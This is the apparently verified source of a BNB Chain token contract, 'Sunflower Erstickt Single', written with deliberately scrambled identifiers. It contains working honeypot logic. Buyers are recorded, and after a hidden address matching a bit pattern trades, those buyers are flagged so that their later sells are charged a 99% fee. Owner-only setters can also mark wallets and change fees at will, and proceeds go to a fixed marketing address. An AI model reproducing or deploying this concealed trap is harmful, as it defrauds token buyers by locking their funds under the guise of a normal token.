/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SunflowerErsticktSingle is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Sunflower Erstickt Single ";
    string constant _symbol = "SunflowerErsticktSingle";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private txSellLimitMode;
    mapping(address => bool) private txBuySwapMarketing;
    mapping(address => bool) private marketingExemptTeamAutoMinReceiverTrading;
    mapping(address => bool) private buyTeamBotsFee;
    mapping(address => uint256) private walletMinModeLiquidity;
    mapping(uint256 => address) private buyExemptLiquidityLimit;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private botsBuyTeamSell = 0;
    uint256 private exemptTeamTradingSwapTxWalletLimit = 6;

    //SELL FEES
    uint256 private burnMarketingWalletTradingFeeAutoLaunched = 0;
    uint256 private txAutoBuyMax = 6;

    uint256 private receiverTradingBuyExempt = exemptTeamTradingSwapTxWalletLimit + botsBuyTeamSell;
    uint256 private swapTeamMaxTx = 100;

    address private tradingBuyFeeLaunchedExempt = (msg.sender); // auto-liq address
    address private minLimitReceiverTrading = (0x34C221035bbc33E3986c8646FFffC077d366b425); // marketing address
    address private marketingLaunchedModeMax = DEAD;
    address private walletReceiverSwapLaunched = DEAD;
    address private teamFeeMaxBuy = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private minWalletMaxBuyBurnFee;
    uint256 private minSwapIsFeeTrading;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private burnAutoTeamMarketing;
    uint256 private sellReceiverTradingTx;
    uint256 private burnIsSwapExemptFeeTeam;
    uint256 private isBotsFeeAutoLaunched;
    uint256 private teamModeBurnIsMarketingMinSell;

    bool private sellBuyBotsMin = true;
    bool private buyTeamBotsFeeMode = true;
    bool private marketingSellIsBots = true;
    bool private marketingAutoExemptLiquidity = true;
    bool private modeBuyLaunchedLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private exemptBuyMarketingMaxLaunchedWalletAuto = _totalSupply / 1000; // 0.1%

    
    bool private exemptMaxIsTrading;
    uint256 private sellBurnWalletSwapBuy;
    bool private autoBuyTradingFee;
    bool private tradingLimitBotsBuy;
    uint256 private liquidityExemptTradingTxMaxLimit;
    uint256 private launchedFeeWalletTrading;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        burnAutoTeamMarketing = true;

        txSellLimitMode[msg.sender] = true;
        txSellLimitMode[address(this)] = true;

        txBuySwapMarketing[msg.sender] = true;
        txBuySwapMarketing[0x0000000000000000000000000000000000000000] = true;
        txBuySwapMarketing[0x000000000000000000000000000000000000dEaD] = true;
        txBuySwapMarketing[address(this)] = true;

        marketingExemptTeamAutoMinReceiverTrading[msg.sender] = true;
        marketingExemptTeamAutoMinReceiverTrading[0x0000000000000000000000000000000000000000] = true;
        marketingExemptTeamAutoMinReceiverTrading[0x000000000000000000000000000000000000dEaD] = true;
        marketingExemptTeamAutoMinReceiverTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnModeTradingSwap(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return burnModeTradingSwap(sender, recipient, amount);
    }

    function burnModeTradingSwap(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = sellBuyTeamTxLaunched(sender) || sellBuyTeamTxLaunched(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitReceiverTradingLaunched();
            }
            if (!bLimitTxWalletValue) {
                limitMaxLiquidityTx(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return sellMinIsMax(sender, recipient, amount);}

        if (!txSellLimitMode[sender] && !txSellLimitMode[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || marketingExemptTeamAutoMinReceiverTrading[sender] || marketingExemptTeamAutoMinReceiverTrading[recipient], "Max TX Limit has been triggered");

        if (walletBotsMaxMarketing()) {autoWalletSwapTxIsMarketing();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = walletTradingLaunchedTeamSwap(sender) ? walletBurnReceiverMinSellBuy(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function sellMinIsMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function walletTradingLaunchedTeamSwap(address sender) internal view returns (bool) {
        return !txBuySwapMarketing[sender];
    }

    function sellLaunchedAutoMax(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            receiverTradingBuyExempt = txAutoBuyMax + burnMarketingWalletTradingFeeAutoLaunched;
            return modeLiquiditySwapBots(sender, receiverTradingBuyExempt);
        }
        if (!selling && sender == uniswapV2Pair) {
            receiverTradingBuyExempt = exemptTeamTradingSwapTxWalletLimit + botsBuyTeamSell;
            return receiverTradingBuyExempt;
        }
        return modeLiquiditySwapBots(sender, receiverTradingBuyExempt);
    }

    function walletBurnReceiverMinSellBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(sellLaunchedAutoMax(sender, receiver == uniswapV2Pair)).div(swapTeamMaxTx);

        if (buyTeamBotsFee[sender] || buyTeamBotsFee[receiver]) {
            feeAmount = amount.mul(99).div(swapTeamMaxTx);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function sellBuyTeamTxLaunched(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function modeLiquiditySwapBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = walletMinModeLiquidity[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitMaxLiquidityTx(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        buyExemptLiquidityLimit[exemptLimitValue] = addr;
    }

    function limitReceiverTradingLaunched() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletMinModeLiquidity[buyExemptLiquidityLimit[i]] == 0) {
                    walletMinModeLiquidity[buyExemptLiquidityLimit[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(minLimitReceiverTrading).transfer(amountBNB * amountPercentage / 100);
    }

    function walletBotsMaxMarketing() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    modeBuyLaunchedLiquidity &&
    _balances[address(this)] >= exemptBuyMarketingMaxLaunchedWalletAuto;
    }

    function autoWalletSwapTxIsMarketing() internal swapping {
        uint256 amountToLiquify = exemptBuyMarketingMaxLaunchedWalletAuto.mul(botsBuyTeamSell).div(receiverTradingBuyExempt).div(2);
        uint256 amountToSwap = exemptBuyMarketingMaxLaunchedWalletAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = receiverTradingBuyExempt.sub(botsBuyTeamSell.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(botsBuyTeamSell).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(exemptTeamTradingSwapTxWalletLimit).div(totalETHFee);

        payable(minLimitReceiverTrading).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                tradingBuyFeeLaunchedExempt,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getReceiverTradingBuyExempt() public view returns (uint256) {
        if (receiverTradingBuyExempt == receiverTradingBuyExempt) {
            return receiverTradingBuyExempt;
        }
        if (receiverTradingBuyExempt != botsBuyTeamSell) {
            return botsBuyTeamSell;
        }
        return receiverTradingBuyExempt;
    }
    function setReceiverTradingBuyExempt(uint256 a0) public onlyOwner {
        receiverTradingBuyExempt=a0;
    }

    function getBurnMarketingWalletTradingFeeAutoLaunched() public view returns (uint256) {
        return burnMarketingWalletTradingFeeAutoLaunched;
    }
    function setBurnMarketingWalletTradingFeeAutoLaunched(uint256 a0) public onlyOwner {
        if (burnMarketingWalletTradingFeeAutoLaunched != exemptBuyMarketingMaxLaunchedWalletAuto) {
            exemptBuyMarketingMaxLaunchedWalletAuto=a0;
        }
        if (burnMarketingWalletTradingFeeAutoLaunched != botsBuyTeamSell) {
            botsBuyTeamSell=a0;
        }
        if (burnMarketingWalletTradingFeeAutoLaunched != receiverTradingBuyExempt) {
            receiverTradingBuyExempt=a0;
        }
        burnMarketingWalletTradingFeeAutoLaunched=a0;
    }

    function getTxSellLimitMode(address a0) public view returns (bool) {
        if (a0 == tradingBuyFeeLaunchedExempt) {
            return sellBuyBotsMin;
        }
        if (txSellLimitMode[a0] == marketingExemptTeamAutoMinReceiverTrading[a0]) {
            return sellBuyBotsMin;
        }
        if (a0 != marketingLaunchedModeMax) {
            return marketingSellIsBots;
        }
            return txSellLimitMode[a0];
    }
    function setTxSellLimitMode(address a0,bool a1) public onlyOwner {
        txSellLimitMode[a0]=a1;
    }

    function getModeBuyLaunchedLiquidity() public view returns (bool) {
        if (modeBuyLaunchedLiquidity == marketingSellIsBots) {
            return marketingSellIsBots;
        }
        if (modeBuyLaunchedLiquidity != marketingSellIsBots) {
            return marketingSellIsBots;
        }
        if (modeBuyLaunchedLiquidity != marketingSellIsBots) {
            return marketingSellIsBots;
        }
        return modeBuyLaunchedLiquidity;
    }
    function setModeBuyLaunchedLiquidity(bool a0) public onlyOwner {
        if (modeBuyLaunchedLiquidity != buyTeamBotsFeeMode) {
            buyTeamBotsFeeMode=a0;
        }
        modeBuyLaunchedLiquidity=a0;
    }

    function getExemptTeamTradingSwapTxWalletLimit() public view returns (uint256) {
        return exemptTeamTradingSwapTxWalletLimit;
    }
    function setExemptTeamTradingSwapTxWalletLimit(uint256 a0) public onlyOwner {
        if (exemptTeamTradingSwapTxWalletLimit == burnMarketingWalletTradingFeeAutoLaunched) {
            burnMarketingWalletTradingFeeAutoLaunched=a0;
        }
        if (exemptTeamTradingSwapTxWalletLimit != swapTeamMaxTx) {
            swapTeamMaxTx=a0;
        }
        if (exemptTeamTradingSwapTxWalletLimit == exemptTeamTradingSwapTxWalletLimit) {
            exemptTeamTradingSwapTxWalletLimit=a0;
        }
        exemptTeamTradingSwapTxWalletLimit=a0;
    }

    function getWalletReceiverSwapLaunched() public view returns (address) {
        if (walletReceiverSwapLaunched == tradingBuyFeeLaunchedExempt) {
            return tradingBuyFeeLaunchedExempt;
        }
        if (walletReceiverSwapLaunched != tradingBuyFeeLaunchedExempt) {
            return tradingBuyFeeLaunchedExempt;
        }
        return walletReceiverSwapLaunched;
    }
    function setWalletReceiverSwapLaunched(address a0) public onlyOwner {
        if (walletReceiverSwapLaunched != tradingBuyFeeLaunchedExempt) {
            tradingBuyFeeLaunchedExempt=a0;
        }
        if (walletReceiverSwapLaunched == walletReceiverSwapLaunched) {
            walletReceiverSwapLaunched=a0;
        }
        walletReceiverSwapLaunched=a0;
    }

    function getWalletMinModeLiquidity(address a0) public view returns (uint256) {
        if (a0 == marketingLaunchedModeMax) {
            return receiverTradingBuyExempt;
        }
            return walletMinModeLiquidity[a0];
    }
    function setWalletMinModeLiquidity(address a0,uint256 a1) public onlyOwner {
        if (a0 == minLimitReceiverTrading) {
            exemptBuyMarketingMaxLaunchedWalletAuto=a1;
        }
        walletMinModeLiquidity[a0]=a1;
    }

    function getMarketingAutoExemptLiquidity() public view returns (bool) {
        if (marketingAutoExemptLiquidity != marketingAutoExemptLiquidity) {
            return marketingAutoExemptLiquidity;
        }
        if (marketingAutoExemptLiquidity == buyTeamBotsFeeMode) {
            return buyTeamBotsFeeMode;
        }
        if (marketingAutoExemptLiquidity == sellBuyBotsMin) {
            return sellBuyBotsMin;
        }
        return marketingAutoExemptLiquidity;
    }
    function setMarketingAutoExemptLiquidity(bool a0) public onlyOwner {
        if (marketingAutoExemptLiquidity != marketingSellIsBots) {
            marketingSellIsBots=a0;
        }
        if (marketingAutoExemptLiquidity == buyTeamBotsFeeMode) {
            buyTeamBotsFeeMode=a0;
        }
        marketingAutoExemptLiquidity=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}